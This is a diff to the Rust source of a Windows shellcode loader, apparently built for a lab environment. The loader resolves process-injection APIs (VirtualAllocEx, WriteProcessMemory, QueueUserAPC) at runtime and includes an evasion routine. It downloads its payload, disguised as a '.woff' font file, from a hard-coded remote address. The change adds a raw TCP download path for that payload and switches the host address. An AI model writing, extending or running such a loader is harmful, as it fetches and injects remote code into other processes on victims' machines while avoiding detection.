@@ -1,6 +1,8 @@
 extern crate winapi;
 use reqwest;
 use std::ffi::CString;
+use std::io::Read;
+use std::net::TcpStream;
 use std::ptr::{null, null_mut};
 use std::process::exit;
 use std::thread::sleep;
@@ -66,11 +68,34 @@ type CreateProcessAFunc = unsafe extern "system" fn(LPCSTR, LPSTR, LPSECURITY_AT
 type VirtualAllocExFunc = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
 type QueueUserAPCFunc = unsafe extern "system" fn(PAPCFUNC, HANDLE, ULONG_PTR) -> BOOL;
 
+
 fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    let mut payload = Vec::new();
-    let mut response = reqwest::blocking::get(url)?;
-    response.copy_to(&mut payload)?;
-    Ok(payload)
+    if url.starts_with("https://") || url.starts_with("http://") {
+        let mut payload = Vec::new();
+        let mut response = reqwest::blocking::get(url)?;
+        response.copy_to(&mut payload)?;
+        Ok(payload)
+    } else if url.starts_with("tcp://") {
+        // Strip the tcp:// scheme so TcpStream::connect sees "host:port"
+        let addr = &url["tcp://".len()..];
+        download_binary_to_vec(addr, Duration::from_secs(180))
+    } else {
+        Err("unsupported URL scheme".into())
+    }
+}
+
+fn download_binary_to_vec(
+    addr: &str,
+    timeout: Duration,
+) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut stream = TcpStream::connect(addr)?;
+    stream.set_read_timeout(Some(timeout))?;
+    let mut len_buf = [0u8; 4];
+    stream.read_exact(&mut len_buf)?;
+    let len = u32::from_le_bytes(len_buf) as usize;
+    let mut data = vec![0u8; len];
+    stream.read_exact(&mut data)?;
+    Ok(data)
 }
 
 fn evade() {
@@ -120,7 +145,7 @@ pub fn run_me_for_success() {
     let pw_procmem: WriteProcessMemoryFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &procmem_str)) };
     let pw_queue_user_apc: QueueUserAPCFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };
 
-    let url = "http://192.168.0.108/transcript.woff";
+    let url = "http://10.10.14.3/transcript.woff";
     let payload = match get_payload_from_url(url) {
         Ok(data) => data,
         Err(_e) => {
